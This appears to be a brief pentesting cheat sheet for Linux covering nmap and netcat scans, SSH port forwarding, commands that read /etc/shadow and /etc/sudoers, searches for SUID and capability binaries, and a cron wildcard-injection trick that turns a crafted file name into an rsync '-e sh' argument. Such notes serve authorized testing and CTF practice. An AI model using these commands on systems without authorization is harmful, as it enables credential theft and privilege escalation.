



* [Find SUID-bit set files](#suid-binary)
* [Host Discovery](#host-discovery)
* [Port Scan](#port-scan)
* [Port Forwarding](#port-forwarding)
* [Sudo usage](#audo-usage)
* [Find executable with capabilites](#capabilities-executable)
* [Exploiting wildcards crons](#wild-wildcards)
* [LinEnum.sh](#linenum.sh)




## Listening ports
 `$ netstat -l`

## Host discovery
Assuming that you wanna discover on 10.10.10.0/24 network:

 `$ nmap -sP 10.10.10.0/24`

## Port Scan

Normal scan  

 `$ nmap -sC -sV <<TARGET IP>> -o output_file.nmap`  
All ports scan
 `$ nmap -A -T5 -p- <<TARGET IP>> -o output_file.nmap`  
UDP scan 
 `$ nmap -sU <<TARGET IP>> -o output_fileudp.nmap`  
with ncat
 `$ nc -v -z <<TARGET IP>> 1-9999`

## Port Forwarding
SSH local port forwarding
 `$ ssh -L 9999:google.com:80 user@remotemachine`  
SSH Remote port forwarding
 `$ ssh -R 9999:localhost:1025 user@remotemachine`
in a nutshell:
 `$ ssh -R remoteport:localaddress:localaddressport user@remotemachine`


## Sudo usage

the first thing that we must do in a new machine:  

`sudo -l`    

`cat /etc/passwd ; cat /etc/shadow; cat /etc/sudoers`




## suid binary

`$ find / -perm -u=s 2>/dev/null`


## Capabilities executable

` find / -type f -print0 2>/dev/null  |  xargs -0 getcap   2>/dev/null`


## Wild Wildcards

When a cronjob is running with a wildcard as * as arguments, it can be exploited:

example:  

	- cron :  

	> $ rsync /backup/* rsync://backup:/src/backup-server/

We can create a file that gonna act as an argument, like:  

	> $ touch -- "/backup/-e sh evil_script.sh"

The final command will be executed as:  

	> $ rsync -e sh evil_script.sh rync://backup:/src/backup-server/   


rync will execute the script as the user who runs the cron :D


## LinEnum.sh

Bash script tool who gives you a entire surface map of the system :D  

- [LinkToLinenum](https://github.com/jcatala/h4ckme/tree/master/enumeration/linenum.sh)
- [Link to official repo](https://github.com/rebootuser/LinEnum)





